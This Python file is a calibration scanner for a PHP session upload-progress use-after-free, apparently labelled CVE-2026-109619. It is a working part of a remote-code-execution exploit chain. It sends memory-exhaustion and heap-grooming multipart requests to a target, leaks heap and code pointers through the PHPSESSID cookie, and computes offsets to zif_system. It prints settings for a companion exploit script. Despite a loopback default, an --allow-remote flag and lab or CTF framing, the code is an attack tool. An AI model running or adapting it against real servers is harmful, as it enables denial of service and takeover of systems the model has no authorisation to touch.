#!/usr/bin/env python3
"""Calibration scanner for CVE-2026-109619 (PHP session.upload_progress stale PS(id) UAF).

Probes a new PHP target in five phases and prints a ready-to-paste PROFILES entry
for lab/exploit.py.

Phases:
  0  Fingerprint — GET version page, body/size probes to confirm upload_progress is live.
  1  OOM sweep   — binary-search (depth, count) that reliably triggers OOM.
  2  Heap sweep  — find field_count / leak_bytes that gives a 256-byte PHPSESSID.
  3  Code sweep  — find field/array params that yield a 16-byte code pointer.
  4  Report      — print calibration dict; optionally compute nm offsets from a local binary.

SAFETY: --allow-remote is required for non-loopback targets, and the default
--delay of 0.5 s between requests keeps the probe polite. Each individual request
stays under --max-body (default 950 KB). This tool sends memory-exhaustion
requests; only use it against targets you are authorised to test.

Usage:
    # loopback lab
    python scanner.py --url http://localhost/php-version.php

    # remote CTF target (add --allow-remote)
    python scanner.py --url https://ctf.example.com/php-version.php --allow-remote

    # also compute nm offsets from a local PHP binary
    python scanner.py --url http://localhost/php-version.php \\
                      --local-binary /usr/bin/php
"""

from __future__ import annotations

import argparse
import collections
import http.client
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

CHUNK_MASK = (1 << 21) - 1
COOKIE_BOUNDARY = b"COOKIE-LAB-BOUNDARY"
MAX_RESPONSE_BYTES = 1 << 17
ORDINARY_COOKIE_BYTES = 32
LOOPBACK = {"localhost", "127.0.0.1", "::1"}

# Default OOM sweep search space
OOM_DEPTHS  = list(range(40, 70, 2))   # 40, 42, … 68
OOM_COUNTS  = list(range(800, 1050, 50))

# Heap consumer sweep
HEAP_SMALL_FIELDS = list(range(30, 80, 5))   # number of padding fields
HEAP_FORGE_LENS   = [128, 256, 512]          # target PHPSESSID lengths to probe

# Code consumer sweep
CODE_SMALL_FIELDS_RANGE  = list(range(50, 110, 5))
CODE_ARRAY_SIZES         = [8, 16, 32]
CODE_ARRAY_IDX_RANGE     = list(range(50, 120, 5))


# ---------------------------------------------------------------------------
# Terminal UI — ANSI, stdlib only
# ---------------------------------------------------------------------------

class C:
    """ANSI colour codes."""
    RST  = "\033[0m"
    BOLD = "\033[1m"
    DIM  = "\033[2m"
    RED  = "\033[31m"
    GRN  = "\033[32m"
    YLW  = "\033[33m"
    CYN  = "\033[36m"
    WHT  = "\033[97m"

    @staticmethod
    def supported() -> bool:
        return sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(code: str, text: str) -> str:
    return f"{code}{text}{C.RST}" if C.supported() else text


def banner() -> None:
    lines = [
        "╔══════════════════════════════════════════════════╗",
        "║  OpenPro · php-upload-rce  /  scanner            ║",
        "║  CVE-2026-109619 calibration probe               ║",
        "╚══════════════════════════════════════════════════╝",
    ]
    print()
    for line in lines:
        print(" " + _c(C.CYN + C.BOLD, line))
    print()


def ok(label: str, msg: str) -> None:
    tick = _c(C.GRN, "✓")
    lbl  = _c(C.BOLD, f"{label:<10}")
    print(f" [{tick}] {lbl} {msg}", flush=True)


def fail(label: str, msg: str) -> None:
    cross = _c(C.RED, "✗")
    lbl   = _c(C.BOLD, f"{label:<10}")
    print(f" [{cross}] {lbl} {msg}", flush=True)


def info(label: str, msg: str) -> None:
    dot = _c(C.CYN, "·")
    lbl = _c(C.DIM, f"{label:<10}")
    print(f" [{dot}] {lbl} {msg}", flush=True)


def warn(msg: str) -> None:
    print(" " + _c(C.YLW, f"[!] {msg}"), flush=True)


def section(title: str) -> None:
    print("\n " + _c(C.BOLD + C.WHT, title), flush=True)


def probe_line(n: int, max_n: int, params: str, result: str) -> None:
    """Print an overwriting progress line during sweep loops."""
    prefix = _c(C.CYN, "·")
    counter = _c(C.DIM, f"({n}/{max_n})")
    if sys.stdout.isatty():
        print(f"\r [{prefix}] {'probe':<10} {counter} {params} → {result}    ", end="", flush=True)
    else:
        print(f" [{prefix}] {'probe':<10} {counter} {params} → {result}", flush=True)


def probe_done() -> None:
    """Finish an overwriting progress line."""
    if sys.stdout.isatty():
        print()


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Target:
    scheme: str
    host: str
    port: int
    path: str

    @property
    def host_header(self) -> str:
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"

    def connect(self) -> socket.socket:
        tcp = socket.create_connection((self.host, self.port), timeout=20)
        if self.scheme == "https":
            try:
                tcp = ssl.create_default_context().wrap_socket(tcp, server_hostname=self.host)
            except BaseException:
                tcp.close()
                raise
        tcp.settimeout(20)
        return tcp

    @property
    def is_loopback(self) -> bool:
        return self.host in LOOPBACK


def parse_target(url: str, allow_remote: bool) -> Target:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("--url must be an absolute HTTP(S) URL")
    host = parsed.hostname
    if host not in LOOPBACK and not allow_remote:
        raise ValueError(
            f"Host {host!r} is not loopback. Pass --allow-remote to scan it. "
            "Only scan targets you are authorised to test.")
    return Target(parsed.scheme, host,
                  parsed.port or (443 if parsed.scheme == "https" else 80),
                  parsed.path or "/")


def _get(target: Target, path: str | None = None, timeout: int = 12) -> tuple[int, dict, bytes]:
    cls = http.client.HTTPSConnection if target.scheme == "https" else http.client.HTTPConnection
    conn = cls(target.host, target.port, timeout=timeout)
    try:
        conn.request("GET", path or target.path, headers={"Connection": "close"})
        r = conn.getresponse()
        body = r.read(MAX_RESPONSE_BYTES)
        headers = dict(r.getheaders())
        return r.status, headers, body
    finally:
        conn.close()


def _post_mp(target: Target, body: bytes, boundary: bytes,
             cookie_pairs: int = 0, close: bool = True) -> tuple[int, dict, bytes]:
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Connection: close" if close else "Connection: keep-alive",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary=" + boundary.decode()]
    if cookie_pairs:
        alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
        lines.append("Cookie: " + "".join(
            (alphabet[(i // 36) % 36] + alphabet[i % 36]) + "=;" for i in range(cookie_pairs)))
    request = ("\r\n".join(lines) + "\r\n\r\n").encode() + body

    with target.connect() as conn:
        stream = conn.makefile("rb")
        conn.sendall(request)
        response = http.client.HTTPResponse(type("S", (), {"makefile": lambda *a, **kw: stream})())
        response.begin()
        resp_body = response.read(MAX_RESPONSE_BYTES)
        hdrs = dict(response.getheaders())
    return response.status, hdrs, resp_body


# ---------------------------------------------------------------------------
# Body builders
# ---------------------------------------------------------------------------

def mp_part(boundary: bytes, name: bytes, value: bytes = b"",
            filename: bytes | None = None) -> bytes:
    hdr = b"--" + boundary + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        hdr += b'; filename="' + filename + b'"'
    return hdr + b"\r\n\r\n" + value + b"\r\n"


def mp_finish(parts: list[bytes], boundary: bytes, limit: int) -> bytes:
    body = b"".join(parts) + b"--" + boundary + b"--\r\n"
    if len(body) >= limit:
        raise ValueError(f"Body {len(body)} bytes exceeds {limit}-byte cap")
    return body


def oom_body(depth: int, count: int, field_count: int = 50,
             field_value_size: int = 1, limit: int = 950 * 1024) -> bytes | None:
    b = COOKIE_BOUNDARY
    parts = [mp_part(b, f"p{i:04d}".encode(), b"x" * field_value_size)
             for i in range(field_count)]
    parts += [mp_part(b, b"PHPSESSID", b"\x00"),
              mp_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
              mp_part(b, b"f", b"A" * 64, b"a.txt")]
    for i in range(count):
        name = b"f[" + str(i).encode() + b"]" + b"[x]" * depth
        parts.append(mp_part(b, name, filename=b""))
    body = b"".join(parts) + b"--" + b + b"--\r\n"
    if len(body) >= limit:
        return None
    return body


def heap_probe_body(n_small: int, forge_len: int, limit: int = 950 * 1024) -> bytes:
    b = COOKIE_BOUNDARY
    parts = [mp_part(b, b"PHPSESSID", b"a"),
             mp_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(n_small):
        value = (f"v{i:04d}".encode() + b"x" * 48)[:48]
        parts.append(mp_part(b, str(1000 + i).encode(), value))
    parts.append(mp_part(b, str(1000 + n_small - 1).encode(), b"Z" * 128))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, forge_len)
    forged[0x18] = ord("L")
    parts.append(mp_part(b, b"1999", bytes(forged)))
    return mp_finish(parts, b, limit)


def code_probe_body(n_small: int, n_array: int, arr_idx: int, arr_size: int,
                    limit: int = 950 * 1024) -> bytes | None:
    b = COOKIE_BOUNDARY
    parts = [mp_part(b, b"PHPSESSID", b"a"),
             mp_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(n_small):
        parts.append(mp_part(b, f"s{i:04d}".encode(), b"P" * 24))
    for i in range(n_array):
        for j in range(arr_size if i == arr_idx else 1):
            parts.append(mp_part(b, f"a{i:04d}[{j}]".encode(), b"x" * 16))
    body = b"".join(parts) + b"--" + b + b"--\r\n"
    if len(body) >= limit:
        return None
    return body


# ---------------------------------------------------------------------------
# Cookie parsing
# ---------------------------------------------------------------------------

def parse_cookie(hdrs: dict) -> bytes:
    set_cookie = hdrs.get("Set-Cookie") or hdrs.get("set-cookie") or ""
    encoded = (set_cookie.split("PHPSESSID=", 1)[1].split(";", 1)[0]
               if "PHPSESSID=" in set_cookie else "")
    return urllib.parse.unquote_to_bytes(encoded.replace("+", " "))


def chunk_base_from_cookie(cookie: bytes,
                           heap_min: int = 0x700000000000,
                           heap_max: int = 0x800000000000,
                           min_agree: int = 4) -> int | None:
    if len(cookie) < 32:
        return None
    candidates = []
    for alignment in range(8):
        words = [struct.unpack_from("<Q", cookie, pos)[0]
                 for pos in range(alignment, len(cookie) - 7, 8)]
        counts = collections.Counter(
            v & ~CHUNK_MASK for v in words if heap_min <= v < heap_max)
        if counts:
            base, hits = counts.most_common(1)[0]
            candidates.append((hits, base))
    if not candidates:
        return None
    hits, base = max(candidates)
    return base if hits >= min_agree else None


def code_ptr_from_cookie(cookie: bytes,
                         code_min: int = 0x500000000000,
                         code_max: int = 0x700000000000) -> int | None:
    if len(cookie) != 16 or struct.unpack_from("<Q", cookie)[0] != 16:
        return None
    value = struct.unpack_from("<Q", cookie, 8)[0]
    if code_min <= value < code_max:
        return value
    return None


# ---------------------------------------------------------------------------
# Phase 0: fingerprint
# ---------------------------------------------------------------------------

def phase0_fingerprint(target: Target, delay: float, verbose: bool) -> dict:
    section("Phase 0  fingerprint")
    status, hdrs, body = _get(target)
    powered_by = hdrs.get("X-Powered-By") or hdrs.get("x-powered-by") or ""
    version_line = body.split(b"\n")[0].decode(errors="replace")

    php_match = re.search(r"PHP/([\d.]+)", powered_by)
    php_version = php_match.group(1) if php_match else None

    if php_version:
        ok("version", f"PHP/{php_version}  status={status}")
    else:
        warn(f"no PHP version in X-Powered-By: {powered_by!r}  body[0]={version_line!r}")

    time.sleep(delay)
    body10 = oom_body(40, 800, field_count=20)
    if body10:
        try:
            status2, hdrs2, body2 = _post_mp(target, body10, COOKIE_BOUNDARY, cookie_pairs=10)
            oom_triggered = b"Allowed memory size" in body2 and b"exhausted" in body2
            if oom_triggered:
                ok("oom-probe", f"triggered  status={status2}")
            else:
                warn(f"upload_progress OOM probe: status={status2} oom=False")
        except Exception as exc:
            warn(f"upload_progress probe error: {exc}")
            oom_triggered = False
    else:
        oom_triggered = False

    result = {"php_version": php_version, "powered_by": powered_by,
              "status": status, "oom_probe": oom_triggered}
    if verbose:
        info("detail", json.dumps(result))
    return result


# ---------------------------------------------------------------------------
# Phase 1: OOM sweep
# ---------------------------------------------------------------------------

def phase1_oom(target: Target, delay: float, max_body: int, verbose: bool) -> dict | None:
    section("Phase 1  OOM sweep")
    pairs = [(d, c) for d in OOM_DEPTHS for c in OOM_COUNTS]
    mid = len(pairs) // 2
    pairs = pairs[mid:] + pairs[:mid]

    best: dict | None = None
    tested = 0
    max_probes = 30
    for depth, count in pairs:
        body = oom_body(depth, count, limit=max_body)
        if body is None:
            continue
        time.sleep(delay)
        tested += 1
        try:
            status, hdrs, resp_body = _post_mp(target, body, COOKIE_BOUNDARY, cookie_pairs=100)
            oom = b"Allowed memory size" in resp_body and b"exhausted" in resp_body
            probe_line(tested, max_probes, f"depth={depth} count={count} body={len(body)}",
                       f"oom={oom} status={status}")
            if oom:
                probe_done()
                best = {"depth": depth, "count": count, "body_size": len(body)}
                break
        except Exception as exc:
            probe_done()
            warn(f"depth={depth} count={count} error: {exc}")
        if tested >= max_probes:
            probe_done()
            info("limit", f"stopping OOM sweep after {max_probes} requests")
            break

    if best:
        ok("oom", f"depth={best['depth']} count={best['count']} body={best['body_size']}B")
    else:
        warn("no OOM found in sweep — check memory_limit and upload_progress settings")
    return best


# ---------------------------------------------------------------------------
# Phase 2: heap consumer sweep
# ---------------------------------------------------------------------------

def phase2_heap(target: Target, oom_params: dict, delay: float,
                max_body: int, verbose: bool) -> dict | None:
    section("Phase 2  heap consumer sweep")
    depth = oom_params["depth"]
    count = oom_params["count"]

    best: dict | None = None
    tested = 0
    max_probes = 40
    for n_small in HEAP_SMALL_FIELDS:
        for forge_len in HEAP_FORGE_LENS:
            try:
                prod_body = oom_body(depth, count, limit=max_body)
                cons_body = heap_probe_body(n_small, forge_len, limit=max_body)
            except ValueError:
                continue
            if prod_body is None:
                continue

            time.sleep(delay)
            tested += 1
            try:
                with target.connect() as conn:
                    stream = conn.makefile("rb")
                    prod_frame = _build_frame(target, prod_body, COOKIE_BOUNDARY,
                                             cookie_pairs=100, close=False)
                    cons_frame = _build_frame(target, cons_body, COOKIE_BOUNDARY,
                                             cookie_pairs=0, close=True)
                    conn.sendall(prod_frame + cons_frame)
                    _read_one(stream)
                    status, hdrs_raw, _ = _read_one(stream)
                    cookie = _cookie_from_raw(hdrs_raw)
                    base = chunk_base_from_cookie(cookie)
                    hit = base is not None
                    probe_line(tested, max_probes,
                               f"n_small={n_small} forge_len={forge_len} cookie={len(cookie)}B",
                               f"base={'found' if hit else 'miss'}")
                    if hit:
                        probe_done()
                        best = {"n_small": n_small, "forge_len": forge_len,
                                "chunk_base_example": hex(base)}
                        break
            except Exception as exc:
                probe_done()
                warn(f"n_small={n_small} forge_len={forge_len} error: {exc}")
            if best:
                break
            if tested >= max_probes:
                probe_done()
                info("limit", f"stopping heap sweep after {max_probes} requests")
                break
        if best or tested >= max_probes:
            break

    if best:
        ok("heap", f"n_small={best['n_small']} forge_len={best['forge_len']} base={best['chunk_base_example']}")
    else:
        warn("no heap leak found — calibration incomplete")
    return best


# ---------------------------------------------------------------------------
# Phase 3: code consumer sweep
# ---------------------------------------------------------------------------

def phase3_code(target: Target, oom_params: dict, delay: float,
                max_body: int, verbose: bool) -> dict | None:
    section("Phase 3  code consumer sweep")
    depth = oom_params["depth"] + 1
    count = max(oom_params["count"] - 15, oom_params["count"])

    best: dict | None = None
    tested = 0
    max_probes = 50
    for arr_size in CODE_ARRAY_SIZES:
        for n_small in CODE_SMALL_FIELDS_RANGE:
            for arr_idx in CODE_ARRAY_IDX_RANGE:
                n_array = 983 - n_small
                try:
                    prod_body = oom_body(depth, count, field_count=65,
                                        field_value_size=39, limit=max_body)
                    cons_body = code_probe_body(n_small, n_array, arr_idx, arr_size,
                                               limit=max_body)
                except ValueError:
                    continue
                if prod_body is None or cons_body is None:
                    continue

                time.sleep(delay)
                tested += 1
                try:
                    with target.connect() as conn:
                        stream = conn.makefile("rb")
                        prod_frame = _build_frame(target, prod_body, COOKIE_BOUNDARY,
                                                 cookie_pairs=1001, close=False)
                        cons_frame = _build_frame(target, cons_body, COOKIE_BOUNDARY,
                                                 cookie_pairs=0, close=True)
                        conn.sendall(prod_frame + cons_frame)
                        _read_one(stream)
                        status, hdrs_raw, _ = _read_one(stream)
                        cookie = _cookie_from_raw(hdrs_raw)
                        ptr = code_ptr_from_cookie(cookie)
                        hit = ptr is not None
                        low21 = (ptr & CHUNK_MASK) if ptr else None
                        probe_line(tested, max_probes,
                                   f"arr_size={arr_size} n_small={n_small} arr_idx={arr_idx}",
                                   f"ptr={'found' if hit else 'miss'}" +
                                   (f" low21={low21:#x}" if low21 else ""))
                        if hit:
                            probe_done()
                            best = {"n_small": n_small, "n_array": n_array,
                                    "arr_idx": arr_idx, "arr_size": arr_size,
                                    "dtor_low21": hex(low21),
                                    "dtor_example": hex(ptr)}
                            break
                except Exception as exc:
                    probe_done()
                    warn(f"error: {exc}")
                if best:
                    break
                if tested >= max_probes:
                    probe_done()
                    info("limit", f"stopping code sweep after {max_probes} requests")
                    break
            if best or tested >= max_probes:
                break
        if best or tested >= max_probes:
            break

    if best:
        ok("code", f"n_small={best['n_small']} arr_idx={best['arr_idx']} "
                   f"dtor={best['dtor_example']} low21={best['dtor_low21']}")
    else:
        warn("no code leak found — calibration incomplete")
    return best


# ---------------------------------------------------------------------------
# Phase 4: nm offsets from a local binary
# ---------------------------------------------------------------------------

def phase4_nm(binary: Path) -> dict | None:
    section(f"Phase 4  nm offsets from {binary}")
    try:
        result = subprocess.run(
            ["nm", "-D", str(binary)],
            capture_output=True, text=True, timeout=30)
        symbols: dict[str, int] = {}
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[1] in ("T", "t", "W", "w"):
                try:
                    symbols[parts[2]] = int(parts[0], 16)
                except ValueError:
                    pass
        dtor = symbols.get("zval_ptr_dtor")
        zif_system = symbols.get("zif_system")
        if not dtor or not zif_system:
            warn("could not find zval_ptr_dtor or zif_system in nm output")
            return None
        delta = zif_system - dtor
        low21 = dtor & CHUNK_MASK
        ok("nm", f"zval_ptr_dtor={dtor:#x}  zif_system={zif_system:#x}  delta={delta:#x}  low21={low21:#x}")
        return {"dtor_low21": low21,
                "zif_system_from_dtor": delta,
                "zval_ptr_dtor": dtor,
                "zif_system": zif_system}
    except FileNotFoundError:
        warn("nm not found — install binutils")
        return None
    except Exception as exc:
        warn(f"nm error: {exc}")
        return None


# ---------------------------------------------------------------------------
# HTTP frame helpers (minimal, without full SharedSocket machinery)
# ---------------------------------------------------------------------------

def _build_frame(target: Target, body: bytes, boundary: bytes,
                 cookie_pairs: int = 0, close: bool = True) -> bytes:
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Connection: close" if close else "Connection: keep-alive",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary=" + boundary.decode()]
    if cookie_pairs:
        alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
        lines.append("Cookie: " + "".join(
            (alphabet[(i // 36) % 36] + alphabet[i % 36]) + "=;" for i in range(cookie_pairs)))
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def _read_one(stream) -> tuple[int, list[bytes], bytes]:
    """Read one HTTP response from a raw stream; return (status, raw_headers, body)."""
    status_line = stream.readline(1024)
    status = int(status_line.split()[1]) if status_line else 0
    raw_headers: list[bytes] = []
    content_length = 0
    while True:
        line = stream.readline(8192)
        if not line or line in (b"\r\n", b"\n"):
            break
        raw_headers.append(line)
        if line.lower().startswith(b"content-length:"):
            try:
                content_length = int(line.split(b":", 1)[1].strip())
            except ValueError:
                pass
    body = stream.read(min(content_length, MAX_RESPONSE_BYTES)) if content_length else b""
    return status, raw_headers, body


def _cookie_from_raw(raw_headers: list[bytes]) -> bytes:
    for line in raw_headers:
        if line.lower().startswith(b"set-cookie:"):
            header_val = line.split(b":", 1)[1].strip().decode(errors="replace")
            if "PHPSESSID=" in header_val:
                encoded = header_val.split("PHPSESSID=", 1)[1].split(";", 1)[0]
                return urllib.parse.unquote_to_bytes(encoded.replace("+", " "))
    return b""


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------

def print_profile(fp: dict, hp: dict | None, cp: dict | None,
                  nm: dict | None, oom: dict | None) -> None:
    section("Phase 5  calibration output")
    sep = "─" * 60
    print(f"\n {sep}")
    print("  Paste into PROFILES in lab/exploit.py:\n")

    php_ver = fp.get("php_version") or "UNKNOWN"
    powered_by = fp.get("powered_by") or f"PHP/{php_ver}"

    dtor_low21 = 0
    zif_delta = 0
    if nm:
        dtor_low21 = nm["dtor_low21"]
        zif_delta = nm["zif_system_from_dtor"]
    elif cp:
        try:
            dtor_low21 = int(cp["dtor_low21"], 16)
        except Exception:
            pass

    heap_depth = oom["depth"] if oom else 57
    heap_count = oom["count"] if oom else 950
    code_depth = (oom["depth"] + 1) if oom else 58
    code_count = (oom["count"] - 15) if oom else 935

    n_small_h = hp["n_small"] if hp else 51
    forge_len = hp["forge_len"] if hp else 256

    n_small_c = cp["n_small"] if cp else 73
    n_array_c = cp["n_array"] if cp else 910
    arr_idx   = cp["arr_idx"] if cp else 69
    arr_size  = cp["arr_size"] if cp else 16

    slug = f"scanned-php-{php_ver}".replace(".", "-")

    lines = [
        f'PROFILES["{slug}"] = {{',
        f'    "php_version_header": "{powered_by}",',
        f'    "php_version_body_prefix": b"PHP {php_ver}\\n",',
        f'',
        f'    "dtor_low21": {dtor_low21:#x},            # VERIFY with nm',
        f'    "zif_system_from_dtor": {zif_delta:#x},   # VERIFY with nm',
        f'',
        f'    "heap_carrier_delta": 0x8400000,    # TODO: calibrate on target',
        f'    "heap_carrier_offset": 0x16D1D8,   # TODO: calibrate on target',
        f'',
        f'    "heap_producer": {{"depth": {heap_depth}, "count": {heap_count}, '
        f'"field_count": 50, "field_value_size": 1}},',
        f'    "code_producer": {{"depth": {code_depth}, "count": {code_count}, '
        f'"field_count": 65, "field_value_size": 39}},',
        f'',
        f'    "heap_consumer_small_fields": {n_small_h},',
        f'    "heap_consumer_leak_bytes": {forge_len},',
        f'    "code_consumer_small_fields": {n_small_c},',
        f'    "code_consumer_array_fields": {n_array_c},',
        f'    "code_consumer_array_idx": {arr_idx},',
        f'    "code_consumer_array_size": {arr_size},',
        f'    "code_consumer_leak_bytes": 16,',
        f'',
        f'    "carrier_size": 384,',
        f'    "command_offset": 0x98,',
        f'',
        f'    "heap_min": 0x700000000000,',
        f'    "heap_max": 0x800000000000,',
        f'    "code_min": 0x500000000000,',
        f'    "code_max": 0x700000000000,',
        f'',
        f'    "consumers": 8,',
        f'    "cookie_pairs": 1001,',
        f'    "body_limit": 1 << 20,',
        f'    "min_pointer_agreement": 4,',
        f'}}',
    ]
    for line in lines:
        print("  " + line)
    print(f"\n {sep}\n")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", required=True)
    parser.add_argument("--allow-remote", action="store_true",
                        help="Required for non-loopback targets")
    parser.add_argument("--local-binary", type=Path,
                        help="Local PHP binary to extract nm offsets from")
    parser.add_argument("--max-body", type=int, default=950 * 1024,
                        help="Maximum multipart body size in bytes (default: 950 KiB)")
    parser.add_argument("--delay", type=float, default=0.5,
                        help="Seconds between requests (default: 0.5)")
    parser.add_argument("--skip-heap", action="store_true",
                        help="Skip heap consumer sweep")
    parser.add_argument("--skip-code", action="store_true",
                        help="Skip code consumer sweep")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    banner()

    try:
        target = parse_target(args.url, args.allow_remote)
    except ValueError as exc:
        fail("abort", str(exc))
        return 1

    info("target", f"{args.url}  delay={args.delay}s  max_body={args.max_body}")

    fp = phase0_fingerprint(target, args.delay, args.verbose)
    oom = phase1_oom(target, args.delay, args.max_body, args.verbose)

    hp: dict | None = None
    cp: dict | None = None
    nm: dict | None = None

    if oom and not args.skip_heap:
        hp = phase2_heap(target, oom, args.delay, args.max_body, args.verbose)

    if oom and not args.skip_code:
        cp = phase3_code(target, oom, args.delay, args.max_body, args.verbose)

    if args.local_binary:
        nm = phase4_nm(args.local_binary)

    print_profile(fp, hp, cp, nm, oom)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
